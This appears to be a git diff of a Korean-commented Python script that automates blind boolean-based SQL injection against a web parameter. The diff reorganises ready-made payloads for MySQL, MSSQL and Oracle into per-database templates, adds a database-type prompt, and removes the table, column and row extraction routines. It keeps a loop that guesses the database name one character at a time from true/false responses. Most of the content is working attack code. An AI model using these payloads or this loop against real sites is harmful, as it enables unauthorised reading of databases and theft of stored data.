@@ -11,65 +11,29 @@ param_name = "artist"  # 공격할 파라미터 이름
 true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드
 sleep_time = 1.0  # 요청 간 지연 시간 (초)
 
-# SQL Injection 페이로드 템플릿 설정
+db_type = None
+
+# SQL Injection 페이로드 템플릿 설정 (각 데이터베이스에 맞게)
 payload_templates = {
-    # MySQL 구문
-    "database_name": "1 AND SUBSTRING(DATABASE(), {i}, 1) = '{char}' --",
-    "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}' --",
-    "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
-    "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --",
-
-    # MS SQL Server 구문
-    "mssql_database_name": "1 AND SUBSTRING(DB_NAME(), {i}, 1) = '{char}' --",
-    "mssql_table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_catalog=DB_NAME() OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}' --",
-    "mssql_column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}' --",
-    "mssql_column_data": "1 AND SUBSTRING((SELECT TOP 1 {column_name} FROM {table_name} ORDER BY (SELECT NULL) OFFSET {index} ROWS), {i}, 1) = '{char}' --",
-
-    # Oracle 구문
-    "oracle_database_name": "1 AND SUBSTR((SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL), {i}, 1) = '{char}'",
-    "oracle_table_name": "1 AND SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS rn, table_name FROM all_tables WHERE owner = USER) WHERE rn = {index}), {i}, 1) = '{char}'",
-    "oracle_column_name": "1 AND SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS rn, column_name FROM all_tab_columns WHERE table_name='{table_name}') WHERE rn = {index}), {i}, 1) = '{char}'",
-    "oracle_column_data": "1 AND SUBSTR((SELECT {column_name} FROM (SELECT ROWNUM AS rn, {column_name} FROM {table_name}) WHERE rn = {index}), {i}, 1) = '{char}'",
-
-    # PostgreSQL 구문
-    "pgsql_database_name": "1 AND SUBSTRING(current_database(), {i}, 1) = '{char}' --",
-    "pgsql_table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database() LIMIT 1 OFFSET {index}), {i}, 1) = '{char}' --",
-    "pgsql_column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {index}), {i}, 1) = '{char}' --",
-    "pgsql_column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {index}), {i}, 1) = '{char}' --"
+    "mysql": {
+        "database_name": "1 AND SUBSTRING(DATABASE(), {i}, 1) = '{char}' --",
+        "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}' --",
+        "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
+        "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --"
+    },
+    "mssql": {
+        "database_name": "1 AND SUBSTRING(DB_NAME(), {i}, 1) = '{char}' --",
+        "table_name": "1 AND SUBSTRING((SELECT name FROM sys.tables ORDER BY name OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}' --",
+        "column_name": "1 AND SUBSTRING((SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('{table_name}') ORDER BY column_id OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}' --",
+        "column_data": "1 AND SUBSTRING((SELECT TOP 1 {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {index} ROWS), {i}, 1) = '{char}' --"
+    },
+    "oracle": {
+        "database_name": "1 AND SUBSTR((SELECT sys_context('userenv','db_name') FROM dual), {i}, 1) = '{char}' --",
+        "table_name": "1 AND SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM AS rn FROM all_tables WHERE owner=USER) WHERE rn={index}), {i}, 1) = '{char}' --",
+        "column_name": "1 AND SUBSTR((SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM all_tab_columns WHERE table_name=UPPER('{table_name}')) WHERE rn={index}), {i}, 1) = '{char}' --",
+        "column_data": "1 AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name}, ROWNUM AS rn FROM {table_name}) WHERE rn={index}), {i}, 1) = '{char}' --"
+    }
 }
-
-# CASE WHEN 구문 설명
-# CASE WHEN 구문은 조건에 따라 다른 결과를 반환할 수 있도록 합니다.
-# 예시:
-#   MySQL: SELECT CASE WHEN (조건) THEN '참' ELSE '거짓' END;
-#   MS SQL Server: SELECT CASE WHEN (조건) THEN '참' ELSE '거짓' END;
-#   Oracle: SELECT CASE WHEN (조건) THEN '참' ELSE '거짓' END FROM DUAL;
-#   PostgreSQL: SELECT CASE WHEN (조건) THEN '참' ELSE '거짓' END;
-
-# 데이터베이스 이름, 테이블 이름, 컬럼 이름, 데이터 추출을 위한 CASE WHEN 구문 예시
-# MySQL:
-#   - 데이터베이스 이름: SELECT CASE WHEN (SUBSTRING(DATABASE(), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-#   - 테이블 이름: SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index}, 1), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-#   - 컬럼 이름: SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index}, 1), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-#   - 데이터 추출: SELECT CASE WHEN (SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index}, 1), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-
-# MS SQL Server:
-#   - 데이터베이스 이름: SELECT CASE WHEN (SUBSTRING(DB_NAME(), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-#   - 테이블 이름: SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_catalog=DB_NAME() OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-#   - 컬럼 이름: SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-#   - 데이터 추출: SELECT CASE WHEN (SUBSTRING((SELECT TOP 1 {column_name} FROM {table_name} ORDER BY (SELECT NULL) OFFSET {index} ROWS), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-
-# Oracle:
-#   - 데이터베이스 이름: SELECT CASE WHEN (SUBSTR((SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END FROM DUAL;
-#   - 테이블 이름: SELECT CASE WHEN (SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS rn, table_name FROM all_tables WHERE owner = USER) WHERE rn = {index}), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END FROM DUAL;
-#   - 컬럼 이름: SELECT CASE WHEN (SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS rn, column_name FROM all_tab_columns WHERE table_name='{table_name}') WHERE rn = {index}), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END FROM DUAL;
-#   - 데이터 추출: SELECT CASE WHEN (SUBSTR((SELECT {column_name} FROM (SELECT ROWNUM AS rn, {column_name} FROM {table_name}) WHERE rn = {index}), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END FROM DUAL;
-
-# PostgreSQL:
-#   - 데이터베이스 이름: SELECT CASE WHEN (SUBSTRING(current_database(), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-#   - 테이블 이름: SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database() LIMIT 1 OFFSET {index}), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-#   - 컬럼 이름: SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {index}), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
-#   - 데이터 추출: SELECT CASE WHEN (SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {index}), {i}, 1) = '{char}') THEN '참' ELSE '거짓' END;
 
 # 참/거짓 판별 함수
 def is_true_response(response):
@@ -124,7 +88,7 @@ def get_database_name():
     for i in range(1, 50):  # 최대 길이 50자 가정
         found_char = False
         for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-            payload = payload_templates["database_name"].format(i=i, char=char)
+            payload = payload_templates[db_type]["database_name"].format(i=i, char=char)
             params = {param_name: payload}
             response = send_request(params)
             time.sleep(sleep_time)  # 요청 후 지연
@@ -139,105 +103,6 @@ def get_database_name():
     print(f"[완료] 데이터베이스 이름: {db_name}")
     return db_name
 
-# 테이블 이름 추출 함수
-def get_table_names(limit="ALL"):
-    tables = []
-    print("[정보] 데이터베이스의 테이블 이름을 찾고 있습니다...")
-    for index in range(0, 100 if limit == "ALL" else limit):  # 최대 100개 테이블 또는 사용자 지정 개수
-        table_name = ""
-        for i in range(1, 50):  # 최대 테이블 이름 길이 50자 가정
-            found_char = False
-            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-                payload = payload_templates["table_name"].format(index=index, i=i, char=char)
-                params = {param_name: payload}
-                response = send_request(params)
-                time.sleep(sleep_time)  # 요청 후 지연
-
-                if is_true_response(response):
-                    table_name += char
-                    found_char = True
-                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
-                    break
-            if not found_char:
-                break
-        if table_name:
-            tables.append(table_name)
-            print(f"[테이블 발견] {index + 1}번째 테이블 이름: {table_name}")
-        else:
-            break
-    print(f"[완료] 총 {len(tables)}개의 테이블 이름 추출:\n" + "\n".join(tables))
-    return tables
-
-# 컬럼 이름 추출 함수
-def get_column_names(table_name, limit="ALL"):
-    columns = []
-    print(f"[정보] '{table_name}' 테이블의 컬럼명을 찾고 있습니다...")
-    for index in range(0, 100 if limit == "ALL" else limit):  # 최대 100개 컬럼 또는 사용자 지정 개수
-        column_name = ""
-        for i in range(1, 50):  # 최대 컬럼 이름 길이 50자 가정
-            found_char = False
-            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-                payload = payload_templates["column_name"].format(table_name=table_name, index=index, i=i, char=char)
-                params = {param_name: payload}
-                response = send_request(params)
-                time.sleep(sleep_time)  # 요청 후 지연
-
-                if is_true_response(response):
-                    column_name += char
-                    found_char = True
-                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
-                    break
-            if not found_char:
-                break
-        if column_name:
-            columns.append(column_name)
-            print(f"[컬럼 발견] {index + 1}번째 컬럼 이름: {column_name}")
-        else:
-            break
-    print(f"[완료] 총 {len(columns)}개의 컬럼 이름 추출:\n" + "\n".join(columns))
-    return columns
-
-# 특정 테이블 컬럼의 데이터 추출 함수
-def get_column_data(table_name, column_name, limit="ALL"):
-    data = []
-    print(f"[정보] '{table_name}' 테이블의 '{column_name}' 컬럼 데이터를 찾고 있습니다...")
-
-    for index in range(0, 100 if limit == "ALL" else limit):  # 최대 100개 데이터 행 또는 사용자 지정 개수
-        row_data = ""
-        for i in range(1, 50):  # 데이터 길이 최대 50자 가정
-            found_char = False
-            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-                payload = payload_templates["column_data"].format(table_name=table_name, column_name=column_name, index=index, i=i, char=char)
-                params = {param_name: payload}
-                response = send_request(params)
-                time.sleep(sleep_time)  # 요청 후 지연
-
-                if is_true_response(response):
-                    row_data += char
-                    found_char = True
-                    print(f"[데이터 발견] 위치 {i}에서 '{char}' 문자 발견!")
-                    break
-            if not found_char:
-                break
-        if row_data:
-            data.append(row_data)
-            print(f"[데이터 발견] {index + 1}번째 행 데이터: {row_data}")
-        else:
-            break
-    print(f"[완료] 총 {len(data)}개의 데이터 추출:\n" + "\n".join(data))
-    return data
-
-# 모든 컬럼 데이터 추출 함수
-def get_all_column_data(table_name, limit="ALL"):
-    columns = get_column_names(table_name)  # 해당 테이블의 모든 컬럼명을 추출
-    all_data = {}
-
-    for column in columns:
-        print(f"\n[정보] '{table_name}' 테이블의 '{column}' 컬럼 데이터를 찾고 있습니다...")
-        column_data = get_column_data(table_name, column, limit)
-        all_data[column] = column_data
-    return all_data
-
 # 요청 전송 함수
 def send_request(params):
     if request_method == "POST":
@@ -249,7 +114,8 @@ def send_request(params):
 
 # 명령 선택 실행 함수
 def main():
-    global request_method
+    global request_method, db_type
+
     while True:
         print("\n[옵션 선택]")
         print("1. 데이터베이스 추출")
@@ -263,6 +129,11 @@ def main():
             request_method = input("요청 방식을 선택하세요 (GET/POST): ").strip().upper()
             if request_method not in ["GET", "POST"]:
                 print("잘못된 요청 방식입니다. GET 또는 POST 중 하나를 입력하세요.")
+                continue
+
+            db_type = input("데이터베이스 종류를 선택하세요 (mysql/mssql/oracle): ").strip().lower()
+            if db_type not in ["mysql", "mssql", "oracle"]:
+                print("잘못된 데이터베이스 종류입니다. mysql, mssql, oracle 중 하나를 입력하세요.")
                 continue
 
         if choice == "1":
